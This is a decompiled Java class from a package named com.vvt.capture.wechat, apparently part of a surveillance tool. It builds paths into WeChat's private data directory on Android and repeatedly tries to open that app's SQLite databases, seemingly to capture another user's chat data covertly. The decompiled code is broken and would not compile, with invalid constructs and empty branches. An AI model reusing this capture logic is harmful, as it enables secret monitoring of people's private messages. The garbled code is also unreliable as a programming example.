package com.vvt.capture.wechat.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.capture.wechat.d;
import java.io.File;

public class a {
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static SQLiteDatabase a(String paramString)
  {
    return a(paramString, 17);
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt) {
    int i = 0;
    Object localObject1 = null;
    int k = com.vvt.ag.b.a(paramString);
    boolean bool2;
    if (k == 0) {
      Object localObject2 = "/data/data/com.tencent.mm/MicroMsg/%s/sfs/avatar.index";
      int m = 1;
      Object localObject3 = new Object[m];
      localObject3[0] = paramString;
      String str = String.format((String)localObject2, (Object[])localObject3);
      k = a;
      if (k != 0) {}
      k = com.vvt.ag.b.a(str);
      if (k == 0) {
        localObject2 = b(str, paramInt);
        i = 5;
        localObject1 = localObject2;
        k = i;
        while ((localObject1 == null) && (k > 0))
        {
          boolean bool1 = a;
          if (bool1) {}
          long l = 1000L;
          SystemClock.sleep(l);
          localObject3 = b(str, paramInt);
          int j = k + -1;
          k = j;
          localObject1 = localObject3;
        }
      }
      bool2 = b;
      if (!bool2) {}
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject1;
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  private static SQLiteDatabase a(String paramString1, String paramString2, String paramString3, int paramInt, String paramString4)
  {
    if (paramString2 == null) {
      paramString2 = com.vvt.capture.wechat.b.a();
    }
    int i = 0;
    Object localObject = null;
    int k = com.vvt.ag.b.a(paramString2);
    boolean bool2;
    if (k == 0)
    {
      String str = d.b(paramString1, paramString2, paramString3, paramString4);
      k = a;
      if (k != 0) {}
      k = com.vvt.ag.b.a(str);
      if (k == 0)
      {
        SQLiteDatabase localSQLiteDatabase1 = b(str, paramInt);
        i = 5;
        localObject = localSQLiteDatabase1;
        k = i;
        while ((localObject == null) && (k > 0))
        {
          boolean bool1 = a;
          if (bool1) {}
          long l = 1000L;
          SystemClock.sleep(l);
          SQLiteDatabase localSQLiteDatabase2 = b(str, paramInt);
          int j = k + -1;
          k = j;
          localObject = localSQLiteDatabase2;
        }
      }
      bool2 = b;
      if (!bool2) {}
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  public static SQLiteDatabase a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    return a(paramString1, paramString2, paramString3, 17, paramString4);
  }
  
  public static SQLiteDatabase b(String paramString)
  {
    int i = 17;
    int j = 0;
    Object localObject1 = null;
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>(paramString);
    int m = ((File)localObject2).exists();
    if (m != 0)
    {
      localObject2 = b(paramString, i);
      j = 5;
      localObject1 = localObject2;
      m = j;
      while ((localObject1 == null) && (m > 0))
      {
        boolean bool1 = a;
        if (bool1) {}
        long l = 1000L;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase = b(paramString, i);
        int k = m + -1;
        m = k;
        localObject1 = localSQLiteDatabase;
      }
    }
    boolean bool2 = b;
    if (bool2) {}
    return (SQLiteDatabase)localObject1;
  }
  
  private static SQLiteDatabase b(String paramString, int paramInt) {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */